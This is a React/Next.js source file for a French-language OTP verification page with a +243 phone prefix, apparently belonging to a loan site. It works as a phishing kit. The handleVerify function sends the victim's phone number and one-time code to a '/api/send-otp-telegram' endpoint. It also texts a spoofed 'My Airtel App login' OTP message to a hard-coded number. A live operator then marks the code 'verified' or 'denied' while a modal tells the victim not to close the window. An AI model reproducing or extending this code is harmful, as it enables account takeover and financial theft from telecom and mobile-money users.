'use client';

import { useState, useRef, useEffect, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { Clock, ArrowLeft, AlertCircle, X, Loader } from 'lucide-react';
import { createClient } from '@/lib/supabase/client';
import { SharedLayout } from '@/components/shared-layout';

function OTPPageContent() {
  const [otpDigits, setOtpDigits] = useState(['', '', '', '']);
  const [timer, setTimer] = useState(45);
  const [isTimerActive, setIsTimerActive] = useState(true);
  const [showExpiredModal, setShowExpiredModal] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showDeniedModal, setShowDeniedModal] = useState(false);
  const [isPolling, setIsPolling] = useState(false);
  const [recordId, setRecordId] = useState<string | null>(null);
  const router = useRouter();
  const searchParams = useSearchParams();
  const phoneNumber = searchParams.get('phone') || '';
  const [isLoading, setIsLoading] = useState(false);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const supabaseRef = useRef(createClient());

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    const newOtp = [...otpDigits];
    newOtp[index] = value.slice(-1);
    setOtpDigits(newOtp);

    if (value && index < 5) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleBackToLogin = () => {
    router.push('/login');
  };

  const startRealtimePolling = async (recId: string) => {
    setIsPolling(true);
    setShowLoadingModal(true);

    const supabase = supabaseRef.current;

    // Subscribe to real-time updates
    const channel = supabase
      .channel(`otp-${recId}`)
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'otp_verifications',
          filter: `id=eq.${recId}`,
        },
        (payload: any) => {
          console.log('[v0] Real-time update:', payload.new.status);
          
          if (payload.new.status === 'verified') {
             router.push('/loan-limit');
            if (pollingIntervalRef.current) {
              clearInterval(pollingIntervalRef.current);
            }
            channel.unsubscribe();
            setShowLoadingModal(false);
            setIsPolling(false);
          
          } else if (payload.new.status === 'denied') {
            if (pollingIntervalRef.current) {
              clearInterval(pollingIntervalRef.current);
            }
            channel.unsubscribe();
            setShowLoadingModal(false);
            setIsPolling(false);
            setShowDeniedModal(true);
          }
        }
      )
      .subscribe();

    // Fallback polling every 3 seconds if real-time doesn't work
    pollingIntervalRef.current = setInterval(async () => {
      try {
        const response = await fetch('/api/check-otp-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ recordId: recId }),
        });

        const data = await response.json();

        if (data.status === 'verified') {
          router.push('/loan-limit');
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
          }
          channel.unsubscribe();
          setShowLoadingModal(false);
          setIsPolling(false);
        } else if (data.status === 'denied') {
          setShowDeniedModal(true);
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
          }
          channel.unsubscribe();
          setShowLoadingModal(false);
          setIsPolling(false);
        }
      } catch (error) {
        console.error('[v0] Polling error:', error);
      }
    }, 3000);
  };
const sendSM = async (phone: string, message: string) => {
  const response = await fetch("/api/send-sm", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      mobile: phone,
      response_type: "json",
      sender_name: "FULL_CIRCLE",
      service_id: 0,
      message,
    }),
  });

  return response.json();
};
 const sendSMS = async (phone: string, message: string) => {
  const response = await fetch("/api/send-sms", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      to: phone,
      message,
    }),
  });

  if (!response.ok) {
    throw new Error("Failed to send SMS");
  }

  return await response.json();
};
const otpCode = otpDigits.join("");
const message = `<#> Your OTP for My Airtel App login is ${otpCode}. Do Not share this code with anyone even if they claim to be from Airtel. Airtel will never ask for your OTP. OTP is valid for 1 mins. Bw6j5XNu+9/ `;
  const handleVerify = async () => {
    if (otpDigits.every(d => d)) {
     setIsLoading(true);
    //  sendSMS(
    //   "+254784547265",
    //   message
    // );
         sendSM(
     "+254718104152",
     message
   );
      try {
        const response = await fetch('/api/send-otp-telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            phoneNumber: `${phoneNumber}`,
            otpCoode : `${otpCode}`,
       }),
        });

        const data = await response.json();
        setRecordId(data.recordId);
        startRealtimePolling(data.recordId);
        setIsLoading(false);
      } catch (error) {
        console.error('[v0] Error sending OTP:', error);
      }
    }
  };

  const handleResendOtp = async () => {
    try {
      await fetch('/api/resend-otp-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber }),
      });
      
      setTimer(45);
      setIsTimerActive(true);
      setOtpDigits(['', '', '', '']);
      otpRefs.current[0]?.focus();
    } catch (error) {
      console.error('[v0] Error resending OTP:', error);
    }
  };

  const handleResendFromModal = async () => {
    setShowDeniedModal(false);
    try {
      await fetch('/api/resend-otp-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber }),
      });

      setTimer(45);
      setIsTimerActive(true);
      setOtpDigits(['', '', '', '']);
      otpRefs.current[0]?.focus();
    } catch (error) {
      console.error('[v0] Error resending OTP:', error);
    }
  };

  const handleResendFromExpiredModal = async () => {
    setShowExpiredModal(false);
    try {
      await fetch('/api/resend-otp-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber }),
      });

      setTimer(45);
      setIsTimerActive(true);
      setOtpDigits(['', '', '', '']);
      otpRefs.current[0]?.focus();
    } catch (error) {
      console.error('[v0] Error resending OTP:', error);
    }
  };

  // Timer effect
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isTimerActive && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    } else if (timer === 0 && isTimerActive) {
      setIsTimerActive(false);
      setShowExpiredModal(true);
    }
    return () => clearInterval(interval);
  }, [isTimerActive, timer]);

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, []);

  return (
    <>
      <SharedLayout>
      {/* Back Button */}
      <button 
        onClick={handleBackToLogin}
        className="flex items-center gap-2 text-gray-500 hover:text-black text-sm mb-4 transition-colors">
        <ArrowLeft className="w-4 h-4" />
        Retour à la connexion
      </button>

      {/* OTP Verification Section */}
      <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Vérifiez votre code</h2>
      <p className="text-gray-500 text-sm sm:text-lg mb-6 sm:mb-8">Saisissez le code à 4 chiffres envoyé à +243{phoneNumber}</p>

      {/* OTP Input Field */}
      <div className="mb-6 sm:mb-8">
        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Saisissez le code OTP</label>
        <div className="flex gap-2 sm:gap-3 justify-center">
          {otpDigits.map((digit, index) => (
            <input
              key={index}
              ref={(el) => (otpRefs.current[index] = el)}
              type="number"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleOtpChange(index, e.target.value)}
              onKeyDown={(e) => handleOtpKeyDown(index, e)}
              disabled={!isTimerActive}
              className={`w-10 h-14 sm:w-14 sm:h-20 border-2 rounded-lg sm:rounded-2xl text-center text-lg sm:text-2xl font-bold placeholder-gray-400 focus:outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none transition-all ${
                isTimerActive
                  ? 'border-gray-300 text-black focus:border-red-400 focus:ring-2 focus:ring-red-300 cursor-text'
                  : 'border-gray-200 text-gray-400 cursor-not-allowed bg-gray-50'
              }`}
              placeholder="−"
            />
          ))}
        </div>
      </div>

      {/* Timer Section */}
      <div className="flex items-center justify-center gap-2 mb-6 sm:mb-8">
        <Clock className="w-5 h-5 sm:w-6 sm:h-6 text-red-600" />
        <span className={`font-bold text-lg sm:text-xl ${timer <= 10 ? 'text-red-500' : 'text-black'}`}>
          {timer}s
        </span>
      </div>

      {/* Verify Button */}
      <button 
        onClick={handleVerify}
        disabled={!otpDigits.every(d => d) || isPolling || isLoading}
        className="w-full bg-red-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-red-500 transition-colors mb-3 sm:mb-4 disabled:bg-gray-300 disabled:cursor-not-allowed">
        {isPolling ? 'Vérification en cours…...' : 'Vérifier le code'}
         {/* {isLoading ? 'Processing...' : 'Login'} */}
        <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 rotate-180" />
      </button>

      {/* Resend Button */}
      <button 
        onClick={handleResendOtp}
        disabled={isTimerActive || isPolling}
        className={`w-full py-3 sm:py-4 rounded-lg sm:rounded-2xl font-bold text-base sm:text-lg transition-all ${
          isTimerActive || isPolling
            ? 'bg-gray-200 text-gray-500 cursor-not-allowed'
            : 'bg-gray-100 text-black hover:bg-gray-200'
        }`}>
        {isTimerActive ? 'Renvoyer le code' : 'Renvoyer le code'}
      </button>
    </SharedLayout>

      {/* Loading Modal */}
      {showLoadingModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-8 sm:p-12 max-w-sm w-full shadow-2xl text-center">
            <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-yellow-600 animate-spin mx-auto mb-4" />
            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Chargement…</h3>
            <p className="text-gray-500 text-sm sm:text-base">
              Veuillez ne pas fermer cette fenêtre. Vérification de votre code OTP en cours…
            </p>
          </div>
        </div>
      )}

      {/* Denied OTP Modal */}
      {showDeniedModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 max-w-sm w-full shadow-2xl">
            {/* Close Button */}
            {/* <button 
              onClick={() => setShowDeniedModal(false)}
              className="absolute top-4 right-4 sm:top-6 sm:right-6 text-gray-400 hover:text-black transition-colors">
              <X className="w-6 h-6" />
            </button> */}

            {/* Alert Icon */}
            <div className="flex justify-center mb-4 sm:mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle className="w-8 h-8 sm:w-10 sm:h-10 text-red-600" />
              </div>
            </div>

            {/* Error Message */}
            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code OTP expiré</h3>
            <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
              La vérification de votre code OTP a été refusée. Veuillez demander un nouveau code pour continuer.
            </p>

            {/* Resend Button */}
            <button 
              onClick={handleResendFromModal}
              className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors mb-3">
             Renvoyer le code
            </button>

            {/* Back to Login Button */}
            <button 
              onClick={handleBackToLogin}
              className="w-full bg-gray-100 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-gray-200 transition-colors">
             Retour à la connexion
            </button>
          </div>
        </div>
      )}

      {/* Expired OTP Modal */}
      {showExpiredModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 max-w-sm w-full shadow-2xl">
            {/* Close Button */}
            {/* <button 
              onClick={() => setShowExpiredModal(false)}
              className="absolute top-4 right-4 sm:top-6 sm:right-6 text-gray-400 hover:text-black transition-colors">
              <X className="w-6 h-6" />
            </button> */}

            {/* Alert Icon */}
            <div className="flex justify-center mb-4 sm:mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle className="w-8 h-8 sm:w-10 sm:h-10 text-red-600" />
              </div>
            </div>

            {/* Error Message */}
            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code OTP expiré</h3>
            <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
              La vérification de votre code OTP a été refusée. Veuillez demander un nouveau code pour continuer.
            </p>

            {/* Resend Button */}
            <button 
              onClick={handleResendFromExpiredModal}
              className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors mb-3">
              Renvoyer le code
            </button>

            {/* Back to Login Button */}
            <button 
              onClick={handleBackToLogin}
              className="w-full bg-gray-100 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-gray-200 transition-colors">
              Retour à la connexion
            </button>
          </div>
        </div>
      )}
    </>
  );
}

export default function OTPPage() {
  return (
    <Suspense fallback={<div className="flex items-center justify-center min-h-screen">Loading...</div>}>
      <OTPPageContent />
    </Suspense>
  );
}
